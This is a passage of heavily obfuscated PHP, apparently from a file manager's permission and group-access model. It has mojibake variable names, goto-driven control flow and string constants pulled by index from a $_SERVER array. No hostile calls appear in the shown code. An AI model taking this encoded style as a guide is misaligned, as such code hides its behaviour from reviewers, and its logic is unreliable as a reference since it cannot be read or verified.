count(explode($aê˜©ö¸¡ê[8], trim($f†¦Í°ºÜ[$aê˜©ö¸¡ê[504]], $aê˜©ö¸¡ê[8]))); $CøíëØÛİù[] = $BÍ÷¨ô¿éâ + ($f†¦Í°ºÜ[$aê˜©ö¸¡ê[29]] == $aê˜©ö¸¡ê[77] ? 0 : 1000); goto Eì¿ÃÚ‚ôµ; bø›£Ô¸¥¶: $f†¦Í°ºÜ[$aê˜©ö¸¡ê[1870]] = $this->authTargetInfo($A™ÒËƒ§ª‰); $f†¦Í°ºÜ[$aê˜©ö¸¡ê[504]] = rtrim($f†¦Í°ºÜ[$aê˜©ö¸¡ê[499]], $aê˜©ö¸¡ê[8]) . $aê˜©ö¸¡ê[8] . ltrim($f†¦Í°ºÜ[$aê˜©ö¸¡ê[504]], $aê˜©ö¸¡ê[8]); $cÜ°ë¨ÌˆÒ[] = $f†¦Í°ºÜ; goto E¨Å•í–‡; a¹ùáî¨åˆ: unset($f†¦Í°ºÜ[$aê˜©ö¸¡ê[85]]); $A™ÒËƒ§ª‰ = $F”ƒÄ‹¦Õé[$f†¦Í°ºÜ[$aê˜©ö¸¡ê[404]]]; if (!$A™ÒËƒ§ª‰) { continue; } goto bø›£Ô¸¥¶; DùÄ»ƒÜÏô: unset($f†¦Í°ºÜ[$aê˜©ö¸¡ê[443]]); unset($f†¦Í°ºÜ[$aê˜©ö¸¡ê[441]]); unset($f†¦Í°ºÜ[$aê˜©ö¸¡ê[415]]); goto a¹ùáî¨åˆ; Eì¿ÃÚ‚ôµ: } goto f‰ê©¡õß; E®çä¦ÙİÅ: $aê˜©ö¸¡ê =& $_SERVER[úÉ·öƒÑì©]; $EŞ‡œªïäÂ = Model($aê˜©ö¸¡ê[1213])->sourceListInfo($Eˆ…Ï¦Âøà, !0); $F”ƒÄ‹¦Õé = $this->sourceAuthSelect($Eˆ…Ï¦Âøà); goto D¼£ñâ¹İ¦; C‰–áåÈ…Ø: } private function groupChidldAllRootSource($C¿Ÿ¥ŒŒÀ‡) { $CŞñ•²ˆôÚ =& $_SERVER[úÉ·öƒÑì©]; $a‚éÍÉÈØÌ = Model($CŞñ•²ˆôÚ[1871])->groupChildrenAll($C¿Ÿ¥ŒŒÀ‡); $B¹æášª´Ñ = array($CŞñ•²ˆôÚ[487] => 0, $CŞñ•²ˆôÚ[493] => array($CŞñ•²ˆôÚ[7], $a‚éÍÉÈØÌ), $CŞñ•²ˆôÚ[413] => SourceModel::TYPE_GROUP); $e¹êªçí´‘ = Model($CŞñ•²ˆôÚ[806])->field($CŞñ•²ˆôÚ[404])->where($B¹æášª´Ñ)->select(); $e¹êªçí´‘ = array_to_keyvalue($e¹êªçí´‘, $CŞñ•²ˆôÚ[33], $CŞñ•²ˆôÚ[404]); return $e¹êªçí´‘; } private function authTargetInfo($f©°œÅïğğ) { goto a¨Êš¨†÷×; B»ˆÌÊŸÖä: $fêíÁÇ³²§ = 2 << 25; foreach ($f©°œÅïğğ as $CÖ®†‰ƒ‹) { goto aŠ¥ñ¹µ±¿; a¼ÖØ¥™: $f•Ôö±½®‹ = 0; if ($CÖ®†‰ƒ‹[$bÂáòˆºõ[413]] == SourceModel::TYPE_GROUP) { $f•Ôö±½®‹ = $fêíÁÇ³²§ * 2; } if ($CÖ®†‰ƒ‹[$bÂáòˆºõ[413]] == SourceModel::TYPE_USER) { $f•Ôö±½®‹ = $fêíÁÇ³²§; } goto e®øÃ„é¡; e®øÃ„é¡: if ($CÖ®†‰ƒ‹[$bÂáòˆºõ[413]] == SourceModel::TYPE_USER && $CÖ®†‰ƒ‹[$bÂáòˆºõ[493]] == $bÂáòˆºõ[191]) { $f•Ôö±½®‹ = 0; } $a™ó¨åœ½–[] = $bšò•“ëÏ…[$bÂáòˆºõ[415]] + $f•Ôö±½®‹; goto b„„’†½Çš; aŠ¥ñ¹µ±¿: $bšò•“ëÏ… = Model($bÂáòˆºõ[1866])->listData($CÖ®†‰ƒ‹[$bÂáòˆºõ[1794]]); if (!$bšò•“ëÏ…) { continue; } if ($CÖ®†‰ƒ‹[$bÂáòˆºõ[413]] == SourceModel::TYPE_USER) { $cİì«ĞŒö¸ = Model($bÂáòˆºõ[511])->getInfoSimpleOuter($CÖ®†‰ƒ‹[$bÂáòˆºõ[493]]); if ($cİì«ĞŒö¸[$bÂáòˆºõ[1535]] == $bÂáòˆºõ[1093]) { continue; } if ($cİì«ĞŒö¸[$bÂáòˆºõ[1535]] == $bÂáòˆºõ[191]) { $cİì«ĞŒö¸[$bÂáòˆºõ[28]] = LNG($bÂáòˆºõ[1872]); } } else { $cİì«ĞŒö¸ = Model($bÂáòˆºõ[495])->getInfoSimple($CÖ®†‰ƒ‹[$bÂáòˆºõ[493]]); } goto fÀğÙ„ƒÙ¾; fÀğÙ„ƒÙ¾: if (!$cİì«ĞŒö¸) { continue; } $cİì«ĞŒö¸[$bÂáòˆºõ[455]] = $bšò•“ëÏ…; $Eë’’Ûñàƒ[] = $cİì«ĞŒö¸; goto a¼ÖØ¥™; b„„’†½Çš: } array_multisort($a™ó¨åœ½–, SORT_DESC, $Eë’’Ûñàƒ); goto Bí½‚ˆ™Œ; Bí½‚ˆ™Œ: return $Eë’’Ûñàƒ; goto A¾˜õ¸ÁË©; a¨Êš¨†÷×: $bÂáòˆºõ =& $_SERVER[úÉ·öƒÑì©]; $Eë’’Ûñàƒ = array(); $a™ó¨åœ½– = array(); goto B»ˆÌÊŸÖä; A¾˜õ¸ÁË©: } public function getAllChildrenByUser($eùÖÆ¥”Ä‰, $aÄŒ»è¡å) { goto bÀ½­šá“; Ešìê—•Üˆ: foreach ($cØÛ‘×àšë as $fÄ‡ÇöÎÉ) { $cºĞùå—ÛÍ = !1; foreach ($fÄ‡ÇöÎÉ[$c˜ìŞéöïã[1870]] as $c…Ğš‡Ø§ß) { if ($c…Ğš‡Ø§ß[$c˜ìŞéöïã[1535]]) { if ($c…Ğš‡Ø§ß[$c˜ìŞéöïã[1535]] == $aÄŒ»è¡å) { $cºĞùå—ÛÍ = !0; break; } } if ($c…Ğš‡Ø§ß[$c˜ìŞéöïã[1699]]) { if ($this->groupContainUser($c…Ğš‡Ø§ß[$c˜ìŞéöïã[1699]], $aÄŒ»è¡å)) { $cºĞùå—ÛÍ = !0; break; } } } if ($cºĞùå—ÛÍ) { $aÊˆ„ê«ˆ[] = $fÄ‡ÇöÎÉ; } $c•Ğ«ôÖ£¨ = $fÄ‡ÇöÎÉ[$c˜ìŞéöïã[404]]; if (isset($e¹öâ˜É[$c•Ğ«ôÖ£¨])) { $fÄ‡ÇöÎÉ[$c˜ìŞéöïã[1870]][] = $e¹öâ˜É[$c•Ğ«ôÖ£¨][0]; $e¹öâ˜É[$c•Ğ«ôÖ£¨] = !1; } } $e¹öâ˜É = array_filter(array_values($e¹öâ˜É)); $aÊˆ„ê«ˆ = array_merge($e¹öâ˜É, $aÊˆ„ê«ˆ); goto eò—ƒÂ§ ª; bÀ½­šá“: $c˜ìŞéöïã =& $_SERVER[úÉ·öƒÑì©]; $C¸×‚²†¢õ = Model($c˜ìŞéöïã[515])->getInfo($aÄŒ»è¡å); if (!$aÄŒ»è¡å || !$eùÖÆ¥”Ä‰ || !$C¸×‚²†¢õ) { return array(); } goto C¬î¦¸Æ‘÷; eò—ƒÂ§ ª: return $aÊˆ„ê«ˆ; goto Dä‘¹âŞµŸ; C¬î¦¸Æ‘÷: $DäãÀ—³ö¼ = Model($c˜ìŞéöïã[1213])->sourceInfo($eùÖÆ¥”Ä‰); $e¹öâ˜É = array(); $c îãÛ¥ö½ = 1; goto eŞ’‹ğç†”; eŞ’‹ğç†”: if ($DäãÀ—³ö¼[$c˜ìŞéöïã[487]] == $c˜ìŞéöïã[191] && $DäãÀ—³ö¼[$c˜ìŞéöïã[493]] != $c îãÛ¥ö½ && $this->groupContainUser($DäãÀ—³ö¼[$c˜ìŞéöïã[493]], $aÄŒ»è¡å)) { foreach ($C¸×‚²†¢õ[$c˜ìŞéöïã[1873]] as $CÆéŸïÛ¡†) { $bƒæ“²—‹ó = Model($c˜ìŞéöïã[495])->getInfo($CÆéŸïÛ¡†[$c˜ìŞéöïã[1699]]); $Bß‡×ÖÍ„• = Model($c˜ìŞéöïã[515])->getInfoSimpleOuter($aÄŒ»è¡å); $Bß‡×ÖÍ„•[$c˜ìŞéöïã[455]] = $CÆéŸïÛ¡†[$c˜ìŞéöïã[415]]; if (Model($c˜ìŞéöïã[1866])->authCheckAction($CÆéŸïÛ¡†[$c˜ìŞéöïã[415]][$c˜ìŞéöïã[415]], $c˜ìŞéöïã[1719])) { continue; } $A²ÇŠè›ôÖ = array($c˜ìŞéöïã[28] => $c˜ìŞéöïã[1488] . $bƒæ“²—‹ó[$c˜ìŞéöïã[28]], $c˜ìŞéöïã[404] => $bƒæ“²—‹ó[$c˜ìŞéöïã[85]][$c˜ìŞéöïã[404]], $c˜ìŞéöïã[76] => KodIO::make($bƒæ“²—‹ó[$c˜ìŞéöïã[85]][$c˜ìŞéöïã[404]]), $c˜ìŞéöïã[487] => $c˜ìŞéöïã[191], $c˜ìŞéöïã[413] => $c˜ìŞéöïã[1023], $c˜ìŞéöïã[29] => $c˜ìŞéöïã[526], $c˜ìŞéöïã[504] => $bƒæ“²—‹ó[$c˜ìŞéöïã[500]], $c˜ìŞéöïã[1699] => $bƒæ“²—‹ó[$c˜ìŞéöïã[1699]], $c˜ìŞéöïã[497] => $bƒæ“²—‹ó[$c˜ìŞéöïã[487]], $c˜ìŞéöïã[1870] => array($Bß‡×ÖÍ„•)); $e¹öâ˜É[$A²ÇŠè›ôÖ[$c˜ìŞéöïã[404]]] = $A²ÇŠè›ôÖ; } } $aÊˆ„ê«ˆ = array(); $cØÛ‘×àšë = $this->getAllChildren($eùÖÆ¥”Ä‰); goto Ešìê—•Üˆ; Dä‘¹âŞµŸ: } public function setAllChildrenByUser($DÇ¬‘Ã¢‡¸, $B„îğ˜™à, $cŒõßáŞÃ) { $f¸â¼¡±¡„ =& $_SERVER[úÉ·öƒÑì©]; $cÕğ«Éçö¾ = $this->getAllChildrenByUser($DÇ¬‘Ã¢‡¸, $B„îğ˜™à); if (!$cŒõßáŞÃ || !$cÕğ«Éçö¾) { return !1; } foreach ($cÕğ«Éçö¾ as $eê´«²©¿ƒ) { $DˆÜô©Ÿí = array(); foreach ($eê´«²©¿ƒ[$f¸â¼¡±¡„[1870]] as $cô¢ô±´çÁ) { $cŞšä¯Œâµ = $cô¢ô±´çÁ[$f¸â¼¡±¡„[455]]; $bøÜ–á„İ« = $cô¢ô±´çÁ[$f¸â¼¡±¡„[1535]] ? SourceModel::TYPE_USER : SourceModel::TYPE_GROUP; $cö‘¨Íà³Ş = $cô¢ô±´çÁ[$f¸â¼¡±¡„[1535]] ? $cô¢ô±´çÁ[$f¸â¼¡±¡„[1535]] : $cô¢ô±´çÁ[$f¸â¼¡±¡„[1699]]; if ($cô¢ô±´çÁ[$f¸â¼¡±¡„[1535]] && $cô¢ô±´çÁ[$f¸â¼¡±¡„[1535]] == $B„îğ˜™à) { continue; } $DˆÜô©Ÿí[] = array($f¸â¼¡±¡„[404] => $eê´«²©¿ƒ[$f¸â¼¡±¡„[404]], $f¸â¼¡±¡„[413] => $bøÜ–á„İ«, $f¸â¼¡±¡„[493] => intval($cö‘¨Íà³Ş), $f¸â¼¡±¡„[1794] => isset($cŞšä¯Œâµ[$f¸â¼¡±¡„[402]]) ? intval($cŞšä¯Œâµ[$f¸â¼¡±¡„[402]]) : 0, $f¸â¼¡±¡„[1848] => isset($cŞšä¯Œâµ[$f¸â¼¡±¡„[1848]]) ? intval($cŞšä¯Œâµ[$f¸â¼¡±¡„[1848]]) : -1); } $DˆÜô©Ÿí[] = array($f¸â¼¡±¡„[404] => $eê´«²©¿ƒ[$f¸â¼¡±¡„[404]], $f¸â¼¡±¡„[413] => SourceModel::TYPE_USER, $f¸â¼¡±¡„[493] => intval($B„îğ˜™à), $f¸â¼¡±¡„[1794] => intval($cŒõßáŞÃ), $f¸â¼¡±¡„[1848] => -1); $this->where(array($f¸â¼¡±¡„[419] => $eê´«²©¿ƒ[$f¸â¼¡±¡„[404]]))->delete(); $this->addAll($DˆÜô©Ÿí); } return !0; } public function get($C‰œ‘í²×) { $fç±“’îó¡ = $this->getSourceList(array($C‰œ‘í²×), !0); return $fç±“’îó¡[0]; } public function getSourceList($fŸÂ¨î•ÅÍ, $eÌÌèİ²˜Ø = false, $Cß…Ò„Š÷ñ = false) { goto F¾›éÕîÅ; DğÆÌÎíöÒ: $Dã¥ùÀäÆ¬ = array(); foreach ($eÌÌèİ²˜Ø as $B¬‰‹Øó½Ñ => $cËíâ×‰ÆŒ) { if ($AÄ“ñ¢»éÚ) { $Dã¥ùÀäÆ¬[$B¬‰‹Øó½Ñ] = $BŸğ™Ú¾´; continue; } $Dã¥ùÀäÆ¬[$B¬‰‹Øó½Ñ] = $this->makeSourceAuth($cËíâ×‰ÆŒ, $bÏ‚å¦¨Ûµ, $Cß…Ò„Š÷ñ); } return $Dã¥ùÀäÆ¬; goto EƒË®İ™œ; d‡‚›ŞŠ”…: if (!$eÌÌèİ²˜Ø && count($fŸÂ¨î•ÅÍ) == 1) { $eÌÌèİ²˜Ø = array(); $eÌÌèİ²˜Ø[$fŸÂ¨î•ÅÍ[0]] = $cŸâ–Ó—Õ->sourceInfo($fŸÂ¨î•ÅÍ[0]); } if (!$eÌÌèİ²˜Ø) { $eµ¡‹„ÒÑ = array($DÚˆå‘ŠÛ[419] => array($DÚˆå‘ŠÛ[420], $fŸÂ¨î•ÅÍ)); $eÌÌèİ²˜Ø = $cŸâ–Ó—Õ->field($DÚˆå‘ŠÛ[1874])->where($eµ¡‹„ÒÑ)->select(); $eÌÌèİ²˜Ø = array_to_keyvalue($eÌÌèİ²˜Ø, $DÚˆå‘ŠÛ[404]); } $DİŠ¾É„¹ = $fŸÂ¨î•ÅÍ; goto C™ˆ‹ì¥Š; f„‰ìÌà†Ú: $AÄ“ñ¢»éÚ = $this->userIsRoot($Cß…Ò„Š÷ñ); $Aˆ‰ƒ–«µê = AuthModel::authAll(); $BŸğ™Ú¾´ = array($DÚˆå‘ŠÛ[416] => $Aˆ‰ƒ–«µê, $DÚˆå‘ŠÛ[1875] => array($DÚˆå‘ŠÛ[421] => 0, $DÚˆå‘ŠÛ[1705] => $Aˆ‰ƒ–«µê, $DÚˆå‘ŠÛ[422] => LNG($DÚˆå‘ŠÛ[1876]), $DÚˆå‘ŠÛ[1720] => $DÚˆå‘ŠÛ[1877])); goto DğÆÌÎíöÒ; F¾›éÕîÅ: $DÚˆå‘ŠÛ =& $_SERVER[úÉ·öƒÑì©]; if (!$fŸÂ¨î•ÅÍ) { return array(); } $cŸâ–Ó—Õ = Model($DÚˆå‘ŠÛ[1213]); goto d‡‚›ŞŠ”…; e¡àœÇÖÇ‡: $F‡¿†¡Á™ = $this->sourceAuthSelect($DİŠ¾É„¹); $bÏ‚å¦¨Ûµ = array(); foreach ($DİŠ¾É„¹ as $B¬‰‹Øó½Ñ) { if (isset($F‡¿†¡Á™[$B¬‰‹Øó½Ñ])) { $bÏ‚å¦¨Ûµ[$B¬‰‹Øó½Ñ] = $F‡¿†¡Á™[$B¬‰‹Øó½Ñ]; } } goto f„‰ìÌà†Ú; C™ˆ‹ì¥Š: foreach ($eÌÌèİ²˜Ø as $d†•Œ†ì÷´ => $e¶¢„ŒÒ¶Ó) { $d›É°›åâä = $cŸâ–Ó—Õ->parentLevelArray($e¶¢„ŒÒ¶Ó[$DÚˆå‘ŠÛ[496]]); $DİŠ¾É„¹ = array_merge($DİŠ¾É„¹, array($d†•Œ†ì÷´), array_reverse($d›É°›åâä)); } $DİŠ¾É„¹ = array_values(array_unique($DİŠ¾É„¹)); if (!$DİŠ¾É„¹) { return array(); } goto e¡àœÇÖÇ‡; EƒË®İ™œ: } public function authDeepCheck($c†¨ÎÁË…°, $F—ÎŒ»š×¾ = false) { goto eåØĞà¾µ; ešÜ‚í—Ô£: if (!in_array($c†¨ÎÁË…°, $FŸµİ”‚È[$BÛêğ¸¡›[1878]])) { return !1; } $BÌÌ™ÛÈÏ© = array(); foreach ($FŸµİ”‚È[$BÛêğ¸¡›[1879]] as $dÛ­Ì’ƒİä => $døï‹˜ŠĞÜ) { if (!in_array($c†¨ÎÁË…°, $døï‹˜ŠĞÜ)) { continue; } $BÌÌ™ÛÈÏ©[] = $dÛ­Ì’ƒİä; } goto FèŒ™ƒÈ; eåØĞà¾µ: $BÛêğ¸¡› =& $_SERVER[úÉ·öƒÑì©]; $F—ÎŒ»š×¾ = $F—ÎŒ»š×¾ ? $F—ÎŒ»š×¾ : USER_ID; $FŸµİ”‚È = $this->makeAuthDeep($F—ÎŒ»š×¾); goto ešÜ‚í—Ô£; FèŒ™ƒÈ: if (!$BÌÌ™ÛÈÏ©) { return !1; } $a£˜éà½¹ = $BÌÌ™ÛÈÏ© ? $BÌÌ™ÛÈÏ©[0] : $c†¨ÎÁË…°; return array($BÛêğ¸¡›[416] => -1, $BÛêğ¸¡›[455] => array($BÛêğ¸¡›[421] => $BÛêğ¸¡›[1093], $BÛêğ¸¡›[1705] => $BÛêğ¸¡›[191], $BÛêğ¸¡›[422] => LNG($BÛêğ¸¡›[1880]), $BÛêğ¸¡›[1720] => $BÛêğ¸¡›[1881]), $BÛêğ¸¡›[1882] => LNG($BÛêğ¸¡›[1883]), $BÛêğ¸¡›[1884] => $this->sourceAuthInfo($a£˜éà½¹)); goto a°Æ®ºÅ; a°Æ®ºÅ: } protected function makeAuthDeep($E’­ßóì = false) { goto f…Ï’›–Ñ; B‡İ•ï£‹¶: $e«™Â¼«† = array($c•êí‚†Ó[1878] => $c»˜óôããå, $c•êí‚†Ó[1879] => $AŒÈ„šáâ); $Eã˜·“áãÆ[$E’­ßóì] = $e«™Â¼«†; return $e«™Â¼«†; goto f‘‰°›œÆÌ; f…Ï’›–Ñ: $c•êí‚†Ó =& $_SERVER[úÉ·öƒÑì©]; static $Eã˜·“áãÆ = array(); $E’­ßóì = $E’­ßóì ? $E’­ßóì : USER_ID; goto d—ãøŠ‡Ò; CÖ¥ŠÕÛÛ†: if ($BöÕÇ‚„†Ò) { $fã‹™‡ï‹ = array(array($c•êí‚†Ó[413] => SourceModel::TYPE_USER, $c•êí‚†Ó[493] => $E’­ßóì), array($c•êí‚†Ó[413] => SourceModel::TYPE_GROUP, $c•êí‚†Ó[493] => array($c•êí‚†Ó[420], $BöÕÇ‚„†Ò)), $c•êí‚†Ó[965] => $c•êí‚†Ó[1786]); } $FäÄÊÂŞ  = $this->field($c•êí‚†Ó[1886])->where($fã‹™‡ï‹)->select(); $d®öòÑš‘Ë = array(); goto eÚ¯Óâ¥„›; eÚ¯Óâ¥„›: $A†òæ‹šÑì = array_to_keyvalue_group($FäÄÊÂŞ , $c•êí‚†Ó[404]); foreach ($A†òæ‹šÑì as $bè¬–¢–º => $CÜé¤àÛè¹) { $FñÁ“šİ = $this->authArrayCheck($CÜé¤àÛè¹, $E’­ßóì); if ($FñÁ“šİ[$c•êí‚†Ó[416]] > 0) { $d®öòÑš‘Ë[] = $bè¬–¢–º . $c•êí‚†Ó[33]; } } $c»˜óôããå = array(); goto f›¢Ú­’‘; càˆ´Ûçƒ: $b¢ï³ ¡ß÷ = array(); if ($d®öòÑš‘Ë) { $eâö˜‡İî = $CÁ¼ßˆî”->where(array($c•êí‚†Ó[404] => array($c•êí‚†Ó[420], $d®öòÑš‘Ë)))->select(); foreach ($eâö˜‡İî as $D½õš‹­Æ‚) { $aœ ›òªÎ’ = $CÁ¼ßˆî”->parentLevelArray($D½õš‹­Æ‚[$c•êí‚†Ó[496]]); $c»˜óôããå = array_merge($c»˜óôããå, $aœ ›òªÎ’); $e‹”ºŸ›î[] = $D½õš‹­Æ‚[$c•êí‚†Ó[493]]; $AŒÈ„šáâ[$D½õš‹­Æ‚[$c•êí‚†Ó[404]]] = $aœ ›òªÎ’; $cãÕãÃÊŒÒ[$D½õš‹­Æ‚[$c•êí‚†Ó[404]]] = $D½õš‹­Æ‚[$c•êí‚†Ó[493]]; } } $e‹”ºŸ›î = array_values(array_unique($e‹”ºŸ›î)); goto Dî­²«ŠŒ; Dî­²«ŠŒ: $Fµ…ºñÊ÷” = $e‹”ºŸ›î; foreach ($Fµ…ºñÊ÷” as $e·õĞÇ‚¹å) { $CÇŠÛ´´Á = $FĞß°¾ÕŒÕ->getInfo($e·õĞÇ‚¹å); $aœ ›òªÎ’ = $CÁ¼ßˆî”->parentLevelArray($CÇŠÛ´´Á[$c•êí‚†Ó[496]]); $e‹”ºŸ›î = array_merge($e‹”ºŸ›î, $aœ ›òªÎ’); } $e‹”ºŸ›î = array_values(array_unique($e‹”ºŸ›î)); goto BØÎ»Ûâ‰; d—ãøŠ‡Ò: if (isset($Eã˜·“áãÆ[$E’­ßóì])) { return $Eã˜·“áãÆ[$E’­ßóì]; } $EÒÂÄùÖ = Model($c•êí‚†Ó[1885])->listData(); $eÊŸåº¹ñÒ = array(); goto B·«¤¶†‹Û; BØÎ»Ûâ‰: foreach ($e‹”ºŸ›î as $e·õĞÇ‚¹å) { $CÇŠÛ´´Á = $FĞß°¾ÕŒÕ->getInfo($e·õĞÇ‚¹å); $c»˜óôããå[] = $CÇŠÛ´´Á[$c•êí‚†Ó[85]][$c•êí‚†Ó[404]]; $Aèë«ÅÊÈ[$e·õĞÇ‚¹å] = $CÇŠÛ´´Á[$c•êí‚†Ó[85]][$c•êí‚†Ó[404]]; $b¢ï³ ¡ß÷[$e·õĞÇ‚¹å] = $CÁ¼ßˆî”->parentLevelArray($CÇŠÛ´´Á[$c•êí‚†Ó[496]]); } foreach ($AŒÈ„šáâ as $D‘ÎØÉ·§ => $Fªğñ‰Û¿Ó) { $C›ÉÍäá‹ = $cãÕãÃÊŒÒ[$D‘ÎØÉ·§]; if (!$C›ÉÍäá‹ || !$Aèë«ÅÊÈ[$C›ÉÍäá‹]) { continue; } $f³ƒ”ß¦§Œ = array(); foreach ($b¢ï³ ¡ß÷[$C›ÉÍäá‹] as $e·õĞÇ‚¹å) { $f³ƒ”ß¦§Œ[] = $Aèë«ÅÊÈ[$e·õĞÇ‚¹å]; } $AŒÈ„šáâ[$D‘ÎØÉ·§] = array_merge($f³ƒ”ß¦§Œ, $Fªğñ‰Û¿Ó); } $c»˜óôããå = array_values(array_unique($c»˜óôããå)); goto B‡İ•ï£‹¶; f›¢Ú­’‘: $e‹”ºŸ›î = $BöÕÇ‚„†Ò; $CÁ¼ßˆî” = Model($c•êí‚†Ó[1213]); $FĞß°¾ÕŒÕ = Model($c•êí‚†Ó[495]); goto fŠìÓã—’²; fŠìÓã—’²: $AŒÈ„šáâ = array(); $cãÕãÃÊŒÒ = array(); $Aèë«ÅÊÈ = array(); goto càˆ´Ûçƒ; B·«¤¶†‹Û: foreach ($EÒÂÄùÖ as $A¤’„ƒã) { if ($A¤’„ƒã[$c•êí‚†Ó[415]] == 0 && $A¤’„ƒã[$c•êí‚†Ó[1721]] == $c•êí‚†Ó[87]) { $eÊŸåº¹ñÒ[] = $A¤’„ƒã[$c•êí‚†Ó[402]]; } } $BöÕÇ‚„†Ò = $this->userGroupParents($E’­ßóì); $fã‹™‡ï‹ = array($c•êí‚†Ó[413] => SourceModel::TYPE_USER, $c•êí‚†Ó[493] => $E’­ßóì); goto CÖ¥ŠÕÛÛ†; f‘‰°›œÆÌ: } private function makeSourceAuth($fñªí·Şè, $d×‹´˜«•, $d‘ëŠ³‹×› = false) { goto E¼¾×¯Æ‡Ç; E¼¾×¯Æ‡Ç: $f ã„‘Ë×‚ =& $_SERVER[úÉ·öƒÑì©]; $CÅ›ôŠ­Š = $f ã„‘Ë×‚[87]; $BÅíÄ‹šíä = $fñªí·Şè[$f ã„‘Ë×‚[493]]; goto bá†šÌÊÛ; C³×øËÕø: foreach ($e¢ŠìæòàÜ as $fÃ‡®ì¼áÙ) { if (!isset($d×‹´˜«•[$fÃ‡®ì¼áÙ])) { continue; } $C”‚ˆÆ¡Şó = $this->authMake($d×‹´˜«•[$fÃ‡®ì¼áÙ], $d‘ëŠ³‹×›); if ($C”‚ˆÆ¡Şó[$f ã„‘Ë×‚[455]]) { $DùÄõ ¼×ô = $C”‚ˆÆ¡Şó; break; } } if (!$CŠ¹š¶¥”) { return $DùÄõ ¼×ô; } if (!$DùÄõ ¼×ô && $bŒãºóŠ†Ë) { $DùÄõ ¼×ô = $this->groupAuthInfo($bŒãºóŠ†Ë, $BÅíÄ‹šíä); } goto DÍ¨‘×Ø®á; bá†šÌÊÛ: $CŠ¹š¶¥” = $fñªí·Şè[$f ã„‘Ë×‚[413]] == SourceModel::TYPE_GROUP; $bŒãºóŠ†Ë = $CŠ¹š¶¥” ? $this->groupRootAuth($BÅíÄ‹šíä, $d‘ëŠ³‹×›) : !1; if ($bŒãºóŠ†Ë && Model($f ã„‘Ë×‚[1866])->authCheckAction($bŒãºóŠ†Ë[$f ã„‘Ë×‚[415]], $f ã„‘Ë×‚[1719])) { return $this->groupAuthInfo($bŒãºóŠ†Ë, $BÅíÄ‹šíä); } goto fßº¦ÊÓÄï; fßº¦ÊÓÄï: $e¢ŠìæòàÜ = Model($f ã„‘Ë×‚[1213])->parentLevelArray($fñªí·Şè[$f ã„‘Ë×‚[496]]); $e¢ŠìæòàÜ = array_merge(array($fñªí·Şè[$f ã„‘Ë×‚[404]]), array_reverse($e¢ŠìæòàÜ)); $DùÄõ ¼×ô = !1; goto C³×øËÕø; DÍ¨‘×Ø®á: if (!$DùÄõ ¼×ô) { $C£ˆÄÏÕ‚„ = Model($f ã„‘Ë×‚[495])->getInfo($BÅíÄ‹šíä); $cÃ››à‹É© = explode($f ã„‘Ë×‚[47], trim($C£ˆÄÏÕ‚„[$f ã„‘Ë×‚[496]], $f ã„‘Ë×‚[47])); $cÃ››à‹É© = array_reverse($cÃ››à‹É©); foreach ($cÃ››à‹É© as $b©‚×¸¿¤µ) { if ($b©‚×¸¿¤µ == $f ã„‘Ë×‚[191] || $b©‚×¸¿¤µ == $CÅ›ôŠ­Š) { continue; } $fœÍ÷‹ß¦Â = $this->groupRootAuth($b©‚×¸¿¤µ, $d‘ëŠ³‹×›); if (!$fœÍ÷‹ß¦Â) { continue; } $DùÄõ ¼×ô = $this->groupAuthInfo($fœÍ÷‹ß¦Â, $b©‚×¸¿¤µ); break; } } if (!$DùÄõ ¼×ô || $DùÄõ ¼×ô[$f ã„‘Ë×‚[416]] <= 0) { $AËËìöïÆå = $this->authDeepCheck($fñªí·Şè[$f ã„‘Ë×‚[404]], $d‘ëŠ³‹×›); if ($AËËìöïÆå) { $DùÄõ ¼×ô = $AËËìöïÆå; } } return $DùÄõ ¼×ô; goto B›î…óÙË¦; B›î…óÙË¦: } private function userIsRoot($cù°àÑô— = false) { $FÙ¸Š¡î†Ü =& $_SERVER[úÉ·öƒÑì©]; if (!$cù°àÑô— && _get($GLOBALS, $FÙ¸Š¡î†Ü[494])) { return !0; } $EÆó‘”Ú›Ò = Model($FÙ¸Š¡î†Ü[515])->getInfo($cù°àÑô—); $FÒàéÄË±¬ = Model($FÙ¸Š¡î†Ü[1887])->listData($EÆó‘”Ú›Ò[$FÙ¸Š¡î†Ü[1420]]); if ($FÒàéÄË±¬ && $FÒàéÄË±¬[$FÙ¸Š¡î†Ü[1290]][$FÙ¸Š¡î†Ü[1888]] == 1) { return !0; } return !1; } private function sourceAuthInfo($Fä¼İîºí) { goto Dğ‰µ×¦¤; Dğ‰µ×¦¤: $FÆËŒ °À… =& $_SERVER[úÉ·öƒÑì©]; $AòÛ¥ñÕÕù = Model($FÆËŒ °À…[1213]); $AÀ°“ÄŠºÉ = $AòÛ¥ñÕÕù->sourceInfo($Fä¼İîºí); goto Fô­¶“¾; Aãê‡ìò‰: if (isset($AÀ°“ÄŠºÉ[$FÆËŒ °À…[501]])) { $dæ™Õ…£ù… = explode($FÆËŒ °À…[8], trim($AÀ°“ÄŠºÉ[$FÆËŒ °À…[504]], $FÆËŒ °À…[8])); array_shift($dæ™Õ…£ù…); $AŠ´¿°ó† = $AÀ°“ÄŠºÉ[$FÆËŒ °À…[499]] . $FÆËŒ °À…[1889] . implode($FÆËŒ °À…[8], $dæ™Õ…£ù…); } return array($FÆËŒ °À…[422] => $AÀ°“ÄŠºÉ[$FÆËŒ °À…[28]], $FÆËŒ °À…[76] => KodIO::make($AÀ°“ÄŠºÉ[$FÆËŒ °À…[404]]), $FÆËŒ °À…[1890] => $AŠ´¿°ó†); goto DÆÀôñ„½ê; cŠ†ÖÁ”¤: $B‹Ö™ç±öƒ = $AòÛ¥ñÕÕù->_listAppendPath($B‹Ö™ç±öƒ); $AÀ°“ÄŠºÉ = $B‹Ö™ç±öƒ[0]; $AŠ´¿°ó† = $AÀ°“ÄŠºÉ[$FÆËŒ °À…[504]]; goto Aãê‡ìò‰; Fô­¶“¾: if (!$AÀ°“ÄŠºÉ) { return !1; } $AòÛ¥ñÕÕù->groupPathDisplay($AÀ°“ÄŠºÉ); $B‹Ö™ç±öƒ = array($AÀ°“ÄŠºÉ); goto cŠ†ÖÁ”¤; DÆÀôñ„½ê: } private function groupAuthInfo($a±‚œÖ§¢‰, $DÛ¶·õ˜¤‡) { $e”Œöª±˜ =& $_SERVER[úÉ·öƒÑì©]; $CÀ¸‚Ü¸ = Model($e”Œöª±˜[495])->getInfo($DÛ¶·õ˜¤‡); return array($e”Œöª±˜[1891] => intval($a±‚œÖ§¢‰[$e”Œöª±˜[415]]), $e”Œöª±˜[1875] => $a±‚œÖ§¢‰, $e”Œöª±˜[1892] => LNG($e”Œöª±˜[1893]), $e”Œöª±˜[1884] => array($e”Œöª±˜[422] => 